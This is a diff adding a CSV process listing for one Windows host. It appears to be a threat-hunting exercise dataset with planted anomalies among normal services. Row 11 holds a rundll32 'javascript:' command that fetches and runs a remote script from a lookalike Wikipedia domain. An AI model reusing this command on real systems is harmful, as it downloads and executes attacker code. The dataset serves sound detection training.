@@ -1,0 +1,140 @@
+,arguments,hostname,name,path,pid,username
+0,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0007PKYEB,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,3281,kyl.san67
+1,c:\windows\system32\svchost.exe -k localservice -p -s CDPSvc,0007PKYEB,svchost.exe,c:\windows\system32,1276,NT AUTHORITY\SYSTEM
+2,,0007PKYEB,SgrmBroker.exe,,480,NT AUTHORITY\SYSTEM
+3,c:\windows\system32\svchost.exe -k localservice -p -s bthserv,0007PKYEB,svchost.exe,c:\windows\system32,2868,NT AUTHORITY\SYSTEM
+4,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s Dhcp,0007PKYEB,svchost.exe,c:\windows\system32,3484,NT AUTHORITY\SYSTEM
+5,c:\windows\system32\svchost.exe -k netsvcs -p -s iphlpsvc,0007PKYEB,svchost.exe,c:\windows\system32,316,NT AUTHORITY\SYSTEM
+6,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DeviceAssociationService,0007PKYEB,svchost.exe,c:\windows\system32,3832,NT AUTHORITY\SYSTEM
+7,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s wscsvc,0007PKYEB,svchost.exe,c:\windows\system32,2256,NT AUTHORITY\SYSTEM
+8,c:\windows\system32\svchost.exe -k localservice -p -s WebClient,0007PKYEB,svchost.exe,c:\windows\system32,5116,NT AUTHORITY\SYSTEM
+9,c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,0007PKYEB,svchost.exe,c:\windows\system32,6496,NT AUTHORITY\SYSTEM
+10,c:\windows\system32\svchost.exe -k networkservice -p -s NlaSvc,0007PKYEB,svchost.exe,c:\windows\system32,3076,NT AUTHORITY\SYSTEM
+11,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Шikipedia.com/drprov.js'"").Exec();""",0007PKYEB,rundll32.exe,C:\Windows\System32\rundll32.exe,588,zarbake19
+12,"""C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe"" -ServerName:App.AppX495fygk72hjw82j58ny5h3nr8hpsd8vs.mca",0007PKYEB,Microsoft.Notes.exe,C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe,5082,ryamorr
+13,,0007PKYEB,SecurityHealthService.exe,,5316,NT AUTHORITY\SYSTEM
+14,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0007PKYEB,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,5281,kyl.san67
+15,,0007PKYEB,svchost.exe,,4088,NT AUTHORITY\SYSTEM
+16,c:\windows\system32\svchost.exe -k networkservice -p -s Dnscache,0007PKYEB,svchost.exe,c:\windows\system32,416,NT AUTHORITY\SYSTEM
+17,c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,0007PKYEB,svchost.exe,c:\windows\system32,4132,NT AUTHORITY\SYSTEM
+18,c:\windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,0007PKYEB,svchost.exe,c:\windows\system32,5956,NT AUTHORITY\SYSTEM
+19,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s WinHttpAutoProxySvc,0007PKYEB,svchost.exe,c:\windows\system32,2320,NT AUTHORITY\SYSTEM
+20,"""fontdrvhost.exe""",0007PKYEB,fontdrvhost.exe,C:\Windows\system32,2692,NT AUTHORITY\SYSTEM
+21,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0007PKYEB,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,5567,kyl.san67
+22,,0007PKYEB,Narrator.exe,C:\Windows\System32\Narrator.exe,4792,NT AUTHORITY\SYSTEM
+23,c:\windows\system32\svchost.exe -k localservicenonetwork -p -s DPS,0007PKYEB,svchost.exe,c:\windows\system32,1888,NT AUTHORITY\SYSTEM
+24,,0007PKYEB,wininit.exe,,6052,NT AUTHORITY\SYSTEM
+25,c:\windows\system32\svchost.exe -k netsvcs -p -s Schedule,0007PKYEB,svchost.exe,c:\windows\system32,4228,NT AUTHORITY\SYSTEM
+26,"""C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe"" ",0007PKYEB,jusched.exe,C:\Program Files (x86)\Common Files\Java\Java Update,976,NT AUTHORITY\SYSTEM
+27,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},0007PKYEB,taskhostw.exe,c:\windows\system32,1776,NT AUTHORITY\SYSTEM
+28,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",0007PKYEB,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,6136,NT AUTHORITY\SYSTEM
+29,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0007PKYEB,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,3949,kyl.san67
+30,C:\Windows\system32\svchost.exe -k imgsvc,0007PKYEB,svchost.exe,C:\Windows\system32,5260,NT AUTHORITY\SYSTEM
+31,C:\Windows\system32\svchost.exe -k SDRSVC,0007PKYEB,svchost.exe,C:\Windows\system32,3572,NT AUTHORITY\SYSTEM
+32,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s TimeBrokerSvc,0007PKYEB,svchost.exe,c:\windows\system32,3660,NT AUTHORITY\SYSTEM
+34,"C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\zarbake19\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\zarbake19\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0007PKYEB,opera_crashreporter.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,2155,zarbake19
+35,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0007PKYEB,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,2395,kyl.san67
+36,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0007PKYEB,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,3956,kyl.san67
+37,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0007PKYEB,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,696,kyl.san67
+38,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,5903,zarbake19
+39,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",0007PKYEB,LockApp.exe,C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy,1944,NT AUTHORITY\SYSTEM
+40,,0007PKYEB,services.exe,,2440,NT AUTHORITY\SYSTEM
+41,c:\windows\system32\svchost.exe -k netsvcs -p,0007PKYEB,svchost.exe,c:\windows\system32,1184,NT AUTHORITY\SYSTEM
+42,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0007PKYEB,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,4078,kyl.san67
+43,\??\C:\Windows\system32\conhost.exe 0x4,0007PKYEB,conhost.exe,C:\Windows\system32,3152,NT AUTHORITY\SYSTEM
+44,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,0007PKYEB,svchost.exe,c:\windows\system32,5640,NT AUTHORITY\SYSTEM
+45,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0007PKYEB,McDiReg.exe,C:\ProgramData\McAfee\Direct,4175,kyl.san67
+46,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,2286,zarbake19
+47,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,6346,zarbake19
+48,"""C:\Program Files\Wireshark\Wireshark.exe"" ",0007PKYEB,Wireshark.exe,C:\Program Files\Wireshark,5770,zarbake19
+49,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,1526,zarbake19
+50,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -s BTAGService,0007PKYEB,svchost.exe,c:\windows\system32,640,NT AUTHORITY\SYSTEM
+53,C:\Windows\system32\svchost.exe -k LocalService -p,0007PKYEB,svchost.exe,C:\Windows\system32,660,NT AUTHORITY\SYSTEM
+54,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,0007PKYEB,ApplicationFrameHost.exe,C:\Windows\system32,5092,NT AUTHORITY\SYSTEM
+56,C:\Windows\system32\SearchIndexer.exe /Embedding,0007PKYEB,SearchIndexer.exe,C:\Windows\system32,6300,NT AUTHORITY\SYSTEM
+57,"""C:\Users\kyl.san67\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0007PKYEB,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\kyl.san67\AppData\Local\Temp\scoped_dir9616_4071,4391,kyl.san67
+58,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s EventLog,0007PKYEB,svchost.exe,c:\windows\system32,5476,NT AUTHORITY\SYSTEM
+59,c:\windows\system32\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV,0007PKYEB,svchost.exe,c:\windows\system32,4084,NT AUTHORITY\SYSTEM
+60,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,382,zarbake19
+62,"""dwm.exe""",0007PKYEB,dwm.exe,C:\Windows\System32,5392,NT AUTHORITY\SYSTEM
+63,c:\windows\system32\svchost.exe -k networkservice -p -s CryptSvc,0007PKYEB,svchost.exe,c:\windows\system32,2808,NT AUTHORITY\SYSTEM
+66,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s StorSvc,0007PKYEB,svchost.exe,c:\windows\system32,3776,NT AUTHORITY\SYSTEM
+68,,0007PKYEB,smss.exe,,3320,NT AUTHORITY\SYSTEM
+69,C:\Windows\System32\RuntimeBroker.exe -Embedding,0007PKYEB,RuntimeBroker.exe,C:\Windows\System32,5296,NT AUTHORITY\SYSTEM
+70,"""ctfmon.exe""",0007PKYEB,ctfmon.exe,C:\Windows\system32,5228,NT AUTHORITY\SYSTEM
+71,c:\windows\system32\svchost.exe -k netsvcs,0007PKYEB,svchost.exe,c:\windows\system32,1304,NT AUTHORITY\SYSTEM
+72,c:\windows\system32\svchost.exe -k localservice -p -s EventSystem,0007PKYEB,svchost.exe,c:\windows\system32,6204,NT AUTHORITY\SYSTEM
+74,,0007PKYEB,csrss.exe,,4432,NT AUTHORITY\SYSTEM
+75,c:\windows\system32\svchost.exe -k netsvcs -p -s TokenBroker,0007PKYEB,svchost.exe,c:\windows\system32,2300,NT AUTHORITY\SYSTEM
+76,c:\windows\system32\svchost.exe -k rpcss -p,0007PKYEB,svchost.exe,c:\windows\system32,2112,NT AUTHORITY\SYSTEM
+77,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TrkWks,0007PKYEB,svchost.exe,c:\windows\system32,1784,NT AUTHORITY\SYSTEM
+78,C:\Windows\system32\BtwRSupportService.exe,0007PKYEB,BtwRSupportService.exe,C:\Windows\system32,4500,NT AUTHORITY\SYSTEM
+79,"""C:\Windows\system32\SearchFilterHost.exe"" 0 736 740 748 8192 744 ",0007PKYEB,SearchFilterHost.exe,C:\Windows\system32,4152,NT AUTHORITY\SYSTEM
+82,c:\windows\system32\svchost.exe -k localservice -p -s LicenseManager,0007PKYEB,svchost.exe,c:\windows\system32,1796,NT AUTHORITY\SYSTEM
+83,c:\windows\system32\svchost.exe -k localservice -p -s SstpSvc,0007PKYEB,svchost.exe,c:\windows\system32,1916,NT AUTHORITY\SYSTEM
+84,c:\windows\system32\svchost.exe -k unistacksvcgroup -s WpnUserService,0007PKYEB,svchost.exe,c:\windows\system32,3364,NT AUTHORITY\SYSTEM
+86,C:\Windows\System32\svchost.exe -k NetworkService -p -s DoSvc,0007PKYEB,svchost.exe,C:\Windows\System32,2188,NT AUTHORITY\SYSTEM
+89,c:\windows\system32\svchost.exe -k netsvcs -p -s WpnService,0007PKYEB,svchost.exe,c:\windows\system32,4552,NT AUTHORITY\SYSTEM
+90,,0007PKYEB,MsMpEng.exe,,5988,NT AUTHORITY\SYSTEM
+91,c:\windows\system32\svchost.exe -k dcomlaunch -p -s LSM,0007PKYEB,svchost.exe,c:\windows\system32,1812,NT AUTHORITY\SYSTEM
+94,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date,0007PKYEB,powershell.exe,C:\Windows\System32\powershell.exe,4232,zarbake19
+95,C:\Windows\System32\WinLogon.exe -SpecialSession,0007PKYEB,WinLogon.exe,C:\Windows\System32,816,NT AUTHORITY\SYSTEM
+98,c:\windows\system32\svchost.exe -k netsvcs -p -s SENS,0007PKYEB,svchost.exe,c:\windows\system32,1452,NT AUTHORITY\SYSTEM
+99,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0007PKYEB,McDiReg.exe,C:\ProgramData\McAfee\Direct,368,kyl.san67
+100,c:\windows\system32\svchost.exe -k localservice -p -s netprofm,0007PKYEB,svchost.exe,c:\windows\system32,448,NT AUTHORITY\SYSTEM
+102,C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},0007PKYEB,DllHost.exe,C:\Windows\system32,5676,NT AUTHORITY\SYSTEM
+103,C:\Windows\System32\svchost.exe -k utcsvc -p,0007PKYEB,svchost.exe,C:\Windows\System32,2784,NT AUTHORITY\SYSTEM
+104,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s PcaSvc,0007PKYEB,svchost.exe,c:\windows\system32,3812,NT AUTHORITY\SYSTEM
+105,c:\windows\system32\svchost.exe -k netsvcs -p -s ShellHWDetection,0007PKYEB,svchost.exe,c:\windows\system32,2376,NT AUTHORITY\SYSTEM
+107,C:\Windows\system32\lsass.exe,0007PKYEB,lsass.exe,C:\Windows\system32,808,NT AUTHORITY\SYSTEM
+108,c:\windows\system32\svchost.exe -k dcomlaunch -p -s PlugPlay,0007PKYEB,svchost.exe,c:\windows\system32,2548,NT AUTHORITY\SYSTEM
+109,c:\windows\system32\svchost.exe -k unistacksvcgroup -s CDPUserSvc,0007PKYEB,svchost.exe,c:\windows\system32,4004,NT AUTHORITY\SYSTEM
+110,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s AudioEndpointBuilder,0007PKYEB,svchost.exe,c:\windows\system32,4660,NT AUTHORITY\SYSTEM
+111,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts,0007PKYEB,svchost.exe,C:\Windows\System32,4916,NT AUTHORITY\SYSTEM
+112,C:\Windows\System32\spoolsv.exe,0007PKYEB,spoolsv.exe,C:\Windows\System32,4772,NT AUTHORITY\SYSTEM
+113,c:\windows\system32\svchost.exe -k netsvcs -p -s ProfSvc,0007PKYEB,svchost.exe,c:\windows\system32,992,NT AUTHORITY\SYSTEM
+115,,0007PKYEB,NisSrv.exe,,2564,NT AUTHORITY\SYSTEM
+120,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0007PKYEB,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,2677,kyl.san67
+121,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DsSvc,0007PKYEB,svchost.exe,c:\windows\system32,940,NT AUTHORITY\SYSTEM
+122,,0007PKYEB,System,,2792,NT AUTHORITY\SYSTEM
+129,c:\windows\system32\svchost.exe -k localservice -p -s WdiServiceHost,0007PKYEB,svchost.exe,c:\windows\system32,2240,NT AUTHORITY\SYSTEM
+130,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0007PKYEB,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,6094,kyl.san67
+131,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,0007PKYEB,svchost.exe,C:\Windows\system32,2572,NT AUTHORITY\SYSTEM
+132,c:\windows\system32\svchost.exe -k netsvcs -p -s Themes,0007PKYEB,svchost.exe,c:\windows\system32,1964,NT AUTHORITY\SYSTEM
+138,,0007PKYEB,Registry,,3140,NT AUTHORITY\SYSTEM
+139,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,0007PKYEB,svchost.exe,C:\Windows\System32,3804,NT AUTHORITY\SYSTEM
+140,c:\windows\system32\svchost.exe -k unistacksvcgroup,0007PKYEB,svchost.exe,c:\windows\system32,2092,NT AUTHORITY\SYSTEM
+142,c:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,0007PKYEB,svchost.exe,c:\windows\system32,4312,NT AUTHORITY\SYSTEM
+146,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,0007PKYEB,svchost.exe,C:\Windows\system32,1176,NT AUTHORITY\SYSTEM
+147,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",0007PKYEB,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,1208,NT AUTHORITY\SYSTEM
+148,C:\Windows\system32\svchost.exe -k DcomLaunch -p,0007PKYEB,svchost.exe,C:\Windows\system32,3120,NT AUTHORITY\SYSTEM
+151,C:\Windows\Explorer.EXE,0007PKYEB,Explorer.EXE,C:\Windows,96,NT AUTHORITY\SYSTEM
+155,C:\Windows\system32\SettingSyncHost.exe -Embedding,0007PKYEB,SettingSyncHost.exe,C:\Windows\system32,3464,NT AUTHORITY\SYSTEM
+156,c:\windows\system32\svchost.exe -k netsvcs -p -s UserManager,0007PKYEB,svchost.exe,c:\windows\system32,516,NT AUTHORITY\SYSTEM
+158,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TabletInputService,0007PKYEB,svchost.exe,c:\windows\system32,5584,NT AUTHORITY\SYSTEM
+160,,0007PKYEB,Memory Compression,,6304,NT AUTHORITY\SYSTEM
+163,c:\windows\system32\svchost.exe -k netsvcs -p -s lfsvc,0007PKYEB,svchost.exe,c:\windows\system32,6252,NT AUTHORITY\SYSTEM
+165,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s NcbService,0007PKYEB,svchost.exe,c:\windows\system32,1880,NT AUTHORITY\SYSTEM
+166,c:\windows\system32\svchost.exe -k appmodel -p -s StateRepository,0007PKYEB,svchost.exe,c:\windows\system32,2160,NT AUTHORITY\SYSTEM
+172,"""C:\Users\kyl.san67\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0007PKYEB,OneDrive.exe,C:\Users\kyl.san67\AppData\Local\Microsoft\OneDrive,4456,kyl.san67
+178,"""fontdrvhost.exe""",0007PKYEB,fontdrvhost.exe,C:\Windows\System32,4948,NT AUTHORITY\SYSTEM
+181,C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,0007PKYEB,svchost.exe,C:\Windows\system32,6000,NT AUTHORITY\SYSTEM
+184,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0007PKYEB,McPvTray.exe,C:\Program Files\McAfee\MAT,3362,kyl.san67
+185,C:\Windows\System32\svchost.exe -k LocalService,0007PKYEB,svchost.exe,C:\Windows\System32\svchost.exe,1564,zarbake19
+186,c:\windows\system32\svchost.exe -k networkservice -p -s LanmanWorkstation,0007PKYEB,svchost.exe,c:\windows\system32,1292,NT AUTHORITY\SYSTEM
+188,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0007PKYEB,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,824,kyl.san67
+189,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0007PKYEB,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,205,kyl.san67
+192,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SensorService,0007PKYEB,svchost.exe,c:\windows\system32,4512,NT AUTHORITY\SYSTEM
+194,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0007PKYEB,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,1295,kyl.san67
+196,C:\Windows\System32\svchost.exe -k csrcsbs,0007PKYEB,svchost.exe,C:\Windows\System32\svchost.exe,2984,ivy.hil
+197,"""C:\Users\ivy.hil\Documents\kitty-0.70.0.6.exe"" ",0007PKYEB,kitty-0.70.0.6.exe,C:\Users\ivy.hil\Documents,2756,ivy.hil
+199,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0007PKYEB,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,702,kyl.san67
+204,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0007PKYEB,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,3085,kyl.san67
+207,c:\windows\system32\svchost.exe -k localservice -p -s FontCache,0007PKYEB,svchost.exe,c:\windows\system32,2012,NT AUTHORITY\SYSTEM
+208,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=renderer --field-trial-handle=1556 1270622256617353588 15561965010207222735 131072 --service-pipe-token=1352282089870284743 --lang=en-US --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --service-request-channel-token=1352282089870284743 --renderer-client-id=45 --mojo-platform-channel-handle=7884 /prefetch:1",0007PKYEB,chrome.exe,C:\Program Files (x86)\Google\Chrome\Application,1131,jayden.foste
+213,sihost.exe,0007PKYEB,sihost.exe,c:\windows\system32,5996,NT AUTHORITY\SYSTEM
+214,"""C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0007PKYEB,opera.exe,C:\Users\zarbake19\AppData\Local\Programs\Opera\56.0.3051.52,1268,zarbake19
+224,c:\windows\system32\svchost.exe -k localservice -p -s BthAvctpSvc,0007PKYEB,svchost.exe,c:\windows\system32,4588,NT AUTHORITY\SYSTEM
+228,c:\windows\system32\svchost.exe -k networkservice -p -s TapiSrv,0007PKYEB,svchost.exe,c:\windows\system32,116,NT AUTHORITY\SYSTEM
+232,c:\windows\system32\svchost.exe -k localservice -p -s nsi,0007PKYEB,svchost.exe,c:\windows\system32,1296,NT AUTHORITY\SYSTEM
+234,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" ",0007PKYEB,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,5677,jayden.foste
